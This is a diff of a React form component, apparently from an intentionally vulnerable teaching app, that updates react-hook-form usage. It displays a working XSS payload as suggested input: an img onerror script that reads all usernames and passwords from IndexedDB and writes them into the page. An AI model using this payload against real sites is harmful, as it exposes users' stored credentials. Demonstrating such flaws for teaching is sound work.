@@ -105,12 +105,13 @@ const Home = () => {
     await db.add("users", data);
     setUsers((prevState) => [...prevState, data]);
     reset(initialState, {
-      dirtyFields: false, // dirtyFields will not be reset
-      isDirty: false, // dirty will not be reset
-      isSubmitted: false,
-      touched: false,
-      isValid: false,
-      submitCount: false,
+      keepDirtyValues: false,
+      // dirtyFields: false, // dirtyFields will not be reset
+      keepDirty: false, // dirty will not be reset
+      keepIsSubmitted: false,
+      keepTouched: false,
+      keepIsValid: false,
+      keepSubmitCount: false,
     });
   };
 
@@ -187,7 +188,7 @@ const Home = () => {
                       {users.map(({ username }, index) => (
                         <Link
                           to={`/${username}`}
-                          key={`${username}-${index}-list`}
+                          key={`${username}-${index}-mobile-list`}
                           className="text-white hover:bg-indigo-600 hover:bg-opacity-75 flex items-center px-2 py-2 text-base font-medium rounded-md"
                         >
                           <LinkArrow className="mr-4 h-6 w-6 text-indigo-300" />
@@ -274,8 +275,7 @@ const Home = () => {
                     <div className="mt-1">
                       <textarea
                         id="username"
-                        name="username"
-                        ref={register({
+                        {...register("username", {
                           required: true,
                         })}
                         className="appearance-none block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm placeholder-gray-400 focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm"
@@ -302,77 +302,77 @@ const Home = () => {
                         className="ml-3 text-gray-700"
                         ref={suggestionRef}
                       >{`<img onerror='
-                  (() => {
-                    const request = indexedDB.open("users_database", 2);
-                    request.onsuccess = function (event) {
-                      const db = event.target.result;
-                      const transaction = db.transaction(["users"], "readwrite");
-                      const objectStore = transaction.objectStore("users");
-                      const contents = objectStore.getAll();
-                      contents.onsuccess = (event) => {
-                        const data = event.target.result;
+                (() => {
+                  const request = indexedDB.open("users_database", 2);
+                  request.onsuccess = function (event) {
+                    const db = event.target.result;
+                    const transaction = db.transaction(["users"], "readwrite");
+                    const objectStore = transaction.objectStore("users");
+                    const contents = objectStore.getAll();
+                    contents.onsuccess = (event) => {
+                      const data = event.target.result;
 
-                        console.log(data, "data");
+                      console.log(data, "data");
 
-                        const main = document.querySelector(".main");
+                      const main = document.querySelector(".main");
 
+                      const tr = document.createElement("tr");
+
+                      const th1 = document.createElement("th");
+                      const th2 = document.createElement("th");
+
+                      th1.classList.add("px-4", "py-2");
+                      th2.classList.add("px-4", "py-2");
+
+                      th1.textContent="Username";
+                      th2.textContent="Password";
+
+                      const thead = document.createElement("thead");
+                      const tbody = document.createElement("tbody");
+
+                      const table = document.createElement("table");
+                      const container = document.createElement("div");
+
+                      thead.classList.add("bg-gray-50");
+
+                      table.classList.add("divide-y", "divide-gray-200");
+
+                      container.classList.add("shadow", "overflow-hidden", "border-b", "border-gray-200", "sm:rounded-lg");
+
+                      tr.append(th1);
+                      tr.append(th2);
+
+                      thead.append(tr);
+                      
+                      table.append(thead);
+
+                      for (const { username, password } of data) {
                         const tr = document.createElement("tr");
+                        const td1 = document.createElement("td");
+                        const td2 = document.createElement("td");
 
-                        const th1 = document.createElement("th");
-                        const th2 = document.createElement("th");
+                        td1.classList.add("border", "px-4", "py-2");
+                        td2.classList.add("border", "px-4", "py-2");
 
-                        th1.classList.add("px-4", "py-2");
-                        th2.classList.add("px-4", "py-2");
+                        td1.textContent = username;
+                        td2.textContent = password;
 
-                        th1.textContent="Username";
-                        th2.textContent="Password";
+                        tr.append(td1);
+                        tr.append(td2);
 
-                        const thead = document.createElement("thead");
-                        const tbody = document.createElement("tbody");
+                        tbody.append(tr);
+                      }
 
-                        const table = document.createElement("table");
-                        const container = document.createElement("div");
+                      table.append(tbody);
 
-                        thead.classList.add("bg-gray-50");
+                      container.append(table);
 
-                        table.classList.add("divide-y", "divide-gray-200");
-
-                        container.classList.add("shadow", "overflow-hidden", "border-b", "border-gray-200", "sm:rounded-lg");
-
-                        tr.append(th1);
-                        tr.append(th2);
-
-                        thead.append(tr);
-                        
-                        table.append(thead);
-
-                        for (const { username, password } of data) {
-                          const tr = document.createElement("tr");
-                          const td1 = document.createElement("td");
-                          const td2 = document.createElement("td");
-
-                          td1.classList.add("border", "px-4", "py-2");
-                          td2.classList.add("border", "px-4", "py-2");
-
-                          td1.textContent = username;
-                          td2.textContent = password;
-
-                          tr.append(td1);
-                          tr.append(td2);
-
-                          tbody.append(tr);
-                        }
-
-                        table.append(tbody);
-
-                        container.append(table);
-
-                        main.append(container);
-                  
-                      };
+                      main.append(container);
+                
                     };
-                  })();
-                ' src='invalid-image'>`}</small>
+                  };
+                })();
+              ' src='invalid-image'>`}</small>
                     </div>
                   </div>
 
@@ -386,13 +386,12 @@ const Home = () => {
                     <div className="mt-1">
                       <input
                         id="password"
-                        name="password"
+                        {...register("password", {
+                          required: true,
+                        })}
                         type="password"
                         autoComplete="current-password"
                         className="appearance-none block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm placeholder-gray-400 focus:outline-none focus:ring-indigo-500 focus:border-indigo-500 sm:text-sm"
-                        ref={register({
-                          required: true,
-                        })}
                       />
                     </div>
                   </div>
